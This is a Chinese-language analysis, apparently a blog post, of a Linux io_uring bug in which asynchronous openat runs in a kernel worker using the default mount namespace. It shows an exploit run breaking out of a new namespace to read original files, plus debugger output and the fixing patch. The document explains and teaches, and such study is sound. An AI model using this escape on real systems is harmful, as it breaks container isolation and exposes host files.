            if (sqe) {                                   
                ret = io_openat_prep(req, sqe);          
                if (ret)                                 
                    break;                               
            }                                            
            ret = io_openat(req, nxt, force_nonblock);
接着调用`do_filp_open` 来打开文件返回文件描述符。貌似没有什么问题呀，正常的调用openat， 正常的打开文件或文件夹。
这是应用场景的不同，这里出现漏洞的原因是它没有对不同的namespace做区分，namespace是linux对系统资源的一种隔离机制，我们熟悉的docker就有用到namespace的东西，namespace相关的东西可以参考[这篇文章](https://segmentfault.com/a/1190000009732550),写的真棒，这里不做过多的描述。
###  利用测试
完整的利用流程如下
    /home/pwn # echo aaaa > /tmp/real
    /home/pwn # echo $$
    206
    /home/pwn # ls -al /proc/$$/ns |grep mnt
    lrwxrwxrwx    1 root     0                0 Apr 15 02:55 mnt -> mnt:[4026531840]
    /home/pwn # pstree -p |grep sh
    init(1)---rcS(171)---sh(206)-+-grep(212)
    /home/pwn # unshare -m --uts /bin/sh
    /bin/sh: can't access tty; job control turned off
    /home/pwn # echo $$
    213
    /home/pwn # pstree -p |grep sh
    init(1)---rcS(171)---sh(206)---sh(213)-+-grep(215)
    /home/pwn # ls -al /proc/$$/ns |grep mnt
    lrwxrwxrwx    1 root     0                0 Apr 15 02:56 mnt -> mnt:[4026532131]
    /home/pwn # mount -t tmpfs none /tmp
    /home/pwn # ls /tmp
    /home/pwn # /exp
    submitted 1, getevents done
    cq_tail = 1
    result: 5
    launching shell
    sh: can't access tty; job control turned off
    /home/pwn # echo $$
    223
    /home/pwn # pstree -p |grep sh
    init(1)---rcS(171)---sh(206)---sh(213)---exp(220)---sh(223)-+-grep(225)
    /home/pwn # ls -al /proc/$$/ns |grep mnt
    lrwxrwxrwx    1 root     0                0 Apr 15 02:57 mnt -> mnt:[4026532131]
    /home/pwn # ls -al /proc/$$/fd/
    total 0
    dr-x------    2 root     0                0 Apr 15 02:58 .
    dr-xr-xr-x    9 root     0                0 Apr 15 02:57 ..
    lrwx------    1 root     0               64 Apr 15 02:58 0 -> /dev/console
    lrwx------    1 root     0               64 Apr 15 02:58 1 -> /dev/console
    lrwx------    1 root     0               64 Apr 15 02:58 2 -> /dev/console
    lr-x------    1 root     0               64 Apr 15 02:58 4 -> /
    l---------    1 root     0               64 Apr 15 02:58 5 -> /
    /home/pwn # cat /proc/$$/fd/5/tmp/real
    aaaa
    /home/pwn # C#
首先创建一个 `/tmp/real` 文件，写入`aaaa`, 看一下当前shell的 mount namespace，
记住他的id为`4026531840`,
    /home/pwn # echo aaaa > /tmp/real
    /home/pwn # echo $$
    206
    /home/pwn # ls -al /proc/$$/ns |grep mnt
    lrwxrwxrwx    1 root     0                0 Apr 15 02:55 mnt -> mnt:[4026531840]
    /home/pwn # pstree -p |grep sh
    init(1)---rcS(171)---sh(206)-+-grep(212)
接着用 `unshare` 创建一个新的 mount namespace, 然后mount 上 tmpfs, 可以看到namespace的
id是`4026532131`，和原来的不同， 这个时候就看不到原来namespace的目录下的东西了(想一下docker的隔离),
    /home/pwn # unshare -m --uts /bin/sh
    /bin/sh: can't access tty; job control turned off
    /home/pwn # echo $$
    213
    /home/pwn # pstree -p |grep sh
    init(1)---rcS(171)---sh(206)---sh(213)-+-grep(215)
    /home/pwn # ls -al /proc/$$/ns |grep mnt
    lrwxrwxrwx    1 root     0                0 Apr 15 02:56 mnt -> mnt:[4026532131]
    /home/pwn # mount -t tmpfs none /tmp
    /home/pwn # ls /tmp
接着运行 exp， 它会打开`/` 目录，返回的`fd`是 5
    /home/pwn # /exp
    submitted 1, getevents done
    cq_tail = 1
    result: 5
    launching shell
    sh: can't access tty; job control turned off
    /home/pwn # echo $$
    223
    /home/pwn # ls -al /proc/$$/fd/
    total 0
    dr-x------    2 root     0                0 Apr 15 02:58 .
    dr-xr-xr-x    9 root     0                0 Apr 15 02:57 ..
    lrwx------    1 root     0               64 Apr 15 02:58 0 -> /dev/console
    lrwx------    1 root     0               64 Apr 15 02:58 1 -> /dev/console
    lrwx------    1 root     0               64 Apr 15 02:58 2 -> /dev/console
    lr-x------    1 root     0               64 Apr 15 02:58 4 -> /
    l---------    1 root     0               64 Apr 15 02:58 5 -> /
    /home/pwn # cat /proc/$$/fd/5/tmp/real
    aaaa
进去看一下可以发现这里打开的是原来namespace的`"/"` 目录。
linux 默认情况下所有的进程都会有一个系统默认的namespace,
也就是说本身linux就是一个最初的容器，我们新的namespace只是在最初的容器下创建一个新容器罢了。
从前面的分析我们知道，最后由于是异步的调用，会在内核线程`io_wqe_worker-0` 里调用 `do_filp_open` `来打开目录，
所有的内核线程都继承自`kthreadd` 线程，使用的是默认的mount namespace
    gef➤  kcurrent                                           
    smp system (__per_cpu_offset) 0xffffffff8245c920         
    cpu_num 0x1                                              
    swapper_pgd 0x0                                          
    cpu #0 : 0xffff88800f200000                              
        current_task: 0xffff88800d080000  :io_wqe_worker-0   
            uid: 0x0   gid: 0x0  :cred 0xffff88800eec2840    
            mm: 0x0                                          
            pgd: 0x0                                         
    gef➤  kproc                                                     
    0x1  :init            :  uid: 0  task: 0xffff88800ed88000
    0x2  :kthreadd        :  uid: 0  task: 0xffff88800ed89600
    0x3  :rcu_gp          :  uid: 0  task: 0xffff88800ed8ac00
    //...
    0xcf :sh              :  uid: 0  task: 0xffff88800d085800
    0xd2 :exp             :  uid: 0  task: 0xffff88800d084200//
    0xd3 :io_wq_manager   :  uid: 0  task: 0xffff88800d081600
    0xd4 :io_wqe_worker-0 :  uid: 0  task: 0xffff88800d080000//
我们看一下他们的namespace
    gef➤  p *((struct task_struct *)0xffff88800d084200)->nsproxy // exp  进程
    $1 = {
      count = {
        counter = 0x2
      },
      uts_ns = 0xffffffff82613620 ,
      ipc_ns = 0xffffffff8273c7c0 ,
      mnt_ns = 0xffff88800d6ece80,
      pid_ns_for_children = 0xffffffff8265f7e0 ,
      net_ns = 0xffffffff827f5ec0 ,
      time_ns = 0xffffffff826bc940 ,
      time_ns_for_children = 0xffffffff826bc940 ,
      cgroup_ns = 0xffffffff826c1780 
    }
    gef➤  p *((struct task_struct *)0xffff88800ed89600)->nsproxy//kthreadd
    $3 = {
      count = {
        counter = 0x35
      },
      uts_ns = 0xffffffff82613620 ,
      ipc_ns = 0xffffffff8273c7c0 ,
      mnt_ns = 0xffff88800ec65680,
      pid_ns_for_children = 0xffffffff8265f7e0 ,
      net_ns = 0xffffffff827f5ec0 ,
      time_ns = 0xffffffff826bc940 ,
      time_ns_for_children = 0xffffffff826bc940 ,
      cgroup_ns = 0xffffffff826c1780 
    }
    gef➤  p *((struct task_struct *)0xffff88800d080000)->nsproxy//io_wqe_worker-0
    $2 = {
      count = {
        counter = 0x35
      },
      uts_ns = 0xffffffff82613620 ,
      ipc_ns = 0xffffffff8273c7c0 ,
      mnt_ns = 0xffff88800ec65680,
      pid_ns_for_children = 0xffffffff8265f7e0 ,
      net_ns = 0xffffffff827f5ec0 ,
      time_ns = 0xffffffff826bc940 ,
      time_ns_for_children = 0xffffffff826bc940 ,
      cgroup_ns = 0xffffffff826c1780 
    }
    gef➤
可以看到，`io_wqe_worker-0` 的`mnt_ns` 地址是`0xffff88800ec65680`
，和默认值一样，因为exp是运行在新的namespace下，它的`mnt_ns=0xffff88800d6ece80`，整理一下
  * 1 exp 运行（`mnt_ns=0xffff88800d6ece80`)
  * 2 io_uring 启动内核线程 openat, 内核线程`io_wqe_worker-0` 使用默认的`mnt_ns`
于是`io_wqe_worker-0` 看到的是一开始的mount namespace, 打开的也是原来namespace的`"/"`
目录，于是我们就可以通过这个fd来任意读里面的内容啦。
###  补丁
给出的[补丁](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=ff002b30181d30cdfbca316dadd099c3ca0d739c)
如下, 添加了`fs` 字段，然后 启动内核线程前把 exp 的 fs 保存到 `req->work.fs` 里面
    @@ -907,6 +915,16 @@ static inline void io_req_work_grab_env(struct io_kiocb *req,
         }
         if (!req->work.creds)
             req->work.creds = get_current_cred();
    +    if (!req->work.fs && def->needs_fs) {
    +        spin_lock(&current->fs->lock);
    +        if (!current->fs->in_exec) {
    +            req->work.fs = current->fs;
    +            req->work.fs->users++;
    +        } else {
    +            req->work.flags |= IO_WQ_WORK_CANCEL;
    +        }
    +        spin_unlock(&current->fs->lock);
    +    }
     }
     static inline void io_req_work_drop_env(struct io_kiocb *req)
    @@ -919,6 +937,16 @@ static inline void io_req_work_drop_env(struct io_kiocb *req)
             put_cred(req->work.creds);
             req->work.creds = NULL;
         }
    +    if (req->work.fs) {
    +        struct fs_struct *fs = req->work.fs;
    +
    +        spin_lock(&req->work.fs->lock);
    +        if (--fs->users)
    +            fs = NULL;
    +        spin_unlock(&req->work.fs->lock);
    +        if (fs)
    +            free_fs_struct(fs);
    +    }
     }
然后再在内核线程里面检查一致性。
    if (work->fs && current->fs != work->fs)     
        current->fs = work->fs;
## 小结
总的来说这里和之前[cve-2019-19241](https://www.anquanke.com/post/id/200486),差不多，都是因为在内核线程里面没有做好检查，然后可以做一些不可描述的事情，漏洞本身其实也不能说是漏洞，就是忘了检查…通过这个issue学习了一波namespace和cgroup的东西，满足:P.
## reference
https://lore.kernel.org/io-uring/PI:EMAIL/T/
https://lore.kernel.org/io-uring/PI:EMAIL/T/